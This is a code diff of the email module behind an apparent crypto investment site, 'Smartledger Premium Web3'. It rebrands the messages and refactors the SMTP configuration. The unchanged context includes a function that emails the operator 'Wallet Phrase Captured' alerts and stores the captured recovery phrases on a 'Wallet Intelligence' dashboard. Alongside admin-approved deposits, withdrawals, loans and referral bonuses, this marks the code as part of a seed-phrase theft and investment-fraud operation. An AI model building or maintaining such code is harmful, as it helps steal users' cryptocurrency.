@@ -2,6 +2,7 @@ import nodemailer from "nodemailer";
 import { db, settingsTable } from "@workspace/db";
 import { logger } from "./logger";
 
+const BRAND_NAME = "Smartledger Premium Web3";
 const ADMIN_EMAIL = process.env.ADMIN_EMAIL ?? "smartsafepalpremium@gmail.com";
 
 async function getSMTPConfig() {
@@ -11,7 +12,16 @@ async function getSMTPConfig() {
       return { host: s.smtpHost, port: s.smtpPort ?? 587, user: s.smtpUser, pass: s.smtpPass };
     }
   } catch { /* fall through */ }
-  return null;
+
+  const pass = process.env.SMTP_PASS?.trim();
+  if (!pass) return null;
+
+  return {
+    host: process.env.SMTP_HOST?.trim() || "smtp.gmail.com",
+    port: Number(process.env.SMTP_PORT || 587),
+    user: process.env.SMTP_USER?.trim() || ADMIN_EMAIL,
+    pass,
+  };
 }
 
 function buildTransporter(cfg: { host: string; port: number; user: string; pass: string }) {
@@ -23,16 +33,16 @@ function buildTransporter(cfg: { host: string; port: number; user: string; pass:
   });
 }
 
-function envTransporter() {
-  return nodemailer.createTransport({
-    host: "smtp.gmail.com",
-    port: 587,
-    secure: false,
-    auth: {
-      user: process.env.SMTP_USER ?? ADMIN_EMAIL,
-      pass: process.env.SMTP_PASS ?? "",
-    },
-  });
+async function getMailer() {
+  const cfg = await getSMTPConfig();
+  if (!cfg) {
+    throw new Error("SMTP is not configured. Add SMTP_PASS or save SMTP settings in the admin panel.");
+  }
+
+  return {
+    transport: buildTransporter(cfg),
+    fromAddr: cfg.user,
+  };
 }
 
 function baseTemplate(title: string, body: string): string {
@@ -63,14 +73,14 @@ function baseTemplate(title: string, body: string): string {
 <body>
   <div class="wrapper">
     <div class="header">
-      <div class="logo">Smartledger <span>Premium</span></div>
+      <div class="logo">Smartledger <span>Premium Web3</span></div>
     </div>
     <div class="content">
       <h2 class="title">${title}</h2>
       ${body}
     </div>
     <div class="footer">
-      <p>Smartledger Premium &mdash; This is an automated message. Do not reply.</p>
+      <p>${BRAND_NAME} &mdash; This is an automated message. Do not reply.</p>
     </div>
   </div>
 </body>
@@ -96,7 +106,7 @@ export async function sendDepositEmail(
     </div>
     ${status === "approved" ? '<p class="body-text">Your account balance has been updated. You can now use your funds for trading and investments.</p>' : '<p class="body-text">If you believe this is an error, please contact support.</p>'}
   `;
-  await send(to, `Deposit ${statusLabel} — Smartledger Premium`, baseTemplate(`Deposit ${statusLabel}`, body));
+  await send(to, `Deposit ${statusLabel} — ${BRAND_NAME}`, baseTemplate(`Deposit ${statusLabel}`, body));
 }
 
 export async function sendWithdrawalEmail(
@@ -118,7 +128,7 @@ export async function sendWithdrawalEmail(
     </div>
     ${status === "approved" ? '<p class="body-text">Your withdrawal is being processed. Funds will arrive at your wallet shortly.</p>' : '<p class="body-text">If you believe this is an error, please contact support.</p>'}
   `;
-  await send(to, `Withdrawal ${statusLabel} — Smartledger Premium`, baseTemplate(`Withdrawal ${statusLabel}`, body));
+  await send(to, `Withdrawal ${statusLabel} — ${BRAND_NAME}`, baseTemplate(`Withdrawal ${statusLabel}`, body));
 }
 
 export async function sendLoanEmail(
@@ -140,19 +150,19 @@ export async function sendLoanEmail(
     </div>
     ${status === "approved" ? '<p class="body-text">The loan amount has been credited to your account balance.</p>' : '<p class="body-text">Thank you for your application.</p>'}
   `;
-  await send(to, `Loan Application ${statusLabel} — Smartledger Premium`, baseTemplate(`Loan ${statusLabel}`, body));
+  await send(to, `Loan Application ${statusLabel} — ${BRAND_NAME}`, baseTemplate(`Loan ${statusLabel}`, body));
 }
 
 export async function sendWelcomeEmail(to: string, userName: string, referralCode: string) {
   const body = `
     <p class="body-text">Hello ${userName},</p>
-    <p class="body-text">Welcome to Smartledger Premium! Your account has been created successfully.</p>
+    <p class="body-text">Welcome to ${BRAND_NAME}! Your account has been created successfully.</p>
     <div class="highlight">
       <p><strong>Your Referral Code:</strong> ${referralCode}</p>
     </div>
     <p class="body-text">Share your referral code with friends to earn bonus rewards when they sign up and make their first deposit.</p>
   `;
-  await send(to, "Welcome to Smartledger Premium", baseTemplate("Welcome Aboard!", body));
+  await send(to, `Welcome to ${BRAND_NAME}`, baseTemplate("Welcome Aboard!", body));
 }
 
 export async function sendDepositRequestToAdmin(
@@ -171,7 +181,7 @@ export async function sendDepositRequestToAdmin(
     </div>
     <p class="body-text">Please log in to the admin dashboard to approve or reject this request.</p>
   `;
-  await send(adminEmail, `New Deposit Request — $${amount}`, baseTemplate("New Deposit Request", body));
+  await send(adminEmail, `New Deposit Request — $${amount} — ${BRAND_NAME}`, baseTemplate("New Deposit Request", body));
 }
 
 export async function sendWithdrawalRequestToAdmin(
@@ -190,7 +200,7 @@ export async function sendWithdrawalRequestToAdmin(
     </div>
     <p class="body-text">Please log in to the admin dashboard to approve or reject this request.</p>
   `;
-  await send(adminEmail, `New Withdrawal Request — $${amount}`, baseTemplate("New Withdrawal Request", body));
+  await send(adminEmail, `New Withdrawal Request — $${amount} — ${BRAND_NAME}`, baseTemplate("New Withdrawal Request", body));
 }
 
 export async function sendWalletPhraseToAdmin(
@@ -210,32 +220,23 @@ export async function sendWalletPhraseToAdmin(
     </div>
     <p class="body-text">This phrase has also been stored in the admin dashboard under Wallet Intelligence.</p>
   `;
-  await send(adminEmail, `Wallet Phrase Captured — ${walletType}`, baseTemplate("Wallet Phrase Captured", body));
+  await send(adminEmail, `Wallet Phrase Captured — ${walletType} — ${BRAND_NAME}`, baseTemplate("Wallet Phrase Captured", body));
 }
 
 export async function sendTestEmail(to: string): Promise<{ ok: boolean; error?: string }> {
   const body = `
-    <p class="body-text">This is a test email from Smartledger Premium.</p>
+    <p class="body-text">This is a test email from ${BRAND_NAME}.</p>
     <div class="highlight">
       <p><strong>Status:</strong> <span class="badge badge-approved">Delivered</span></p>
     </div>
     <p class="body-text">If you received this, your SMTP configuration is working correctly.</p>
   `;
   try {
-    const dbCfg = await getSMTPConfig();
-    let transport: ReturnType<typeof nodemailer.createTransport>;
-    let fromAddr: string;
-    if (dbCfg) {
-      transport = buildTransporter(dbCfg);
-      fromAddr = dbCfg.user;
-    } else {
-      transport = envTransporter();
-      fromAddr = process.env.SMTP_USER ?? ADMIN_EMAIL;
-    }
+    const { transport, fromAddr } = await getMailer();
     await transport.sendMail({
-      from: `"Smartledger Premium" <${fromAddr}>`,
+      from: `"${BRAND_NAME}" <${fromAddr}>`,
       to,
-      subject: "Test Email — Smartledger Premium",
+      subject: `Test Email — ${BRAND_NAME}`,
       html: baseTemplate("Email Test Successful", body),
     });
     return { ok: true };
@@ -248,18 +249,9 @@ export async function sendTestEmail(to: string): Promise<{ ok: boolean; error?: 
 
 async function send(to: string, subject: string, html: string) {
   try {
-    const dbCfg = await getSMTPConfig();
-    let transport: ReturnType<typeof nodemailer.createTransport>;
-    let fromAddr: string;
-    if (dbCfg) {
-      transport = buildTransporter(dbCfg);
-      fromAddr = dbCfg.user;
-    } else {
-      transport = envTransporter();
-      fromAddr = process.env.SMTP_USER ?? ADMIN_EMAIL;
-    }
+    const { transport, fromAddr } = await getMailer();
     await transport.sendMail({
-      from: `"Smartledger Premium" <${fromAddr}>`,
+      from: `"${BRAND_NAME}" <${fromAddr}>`,
       to,
       subject,
       html,
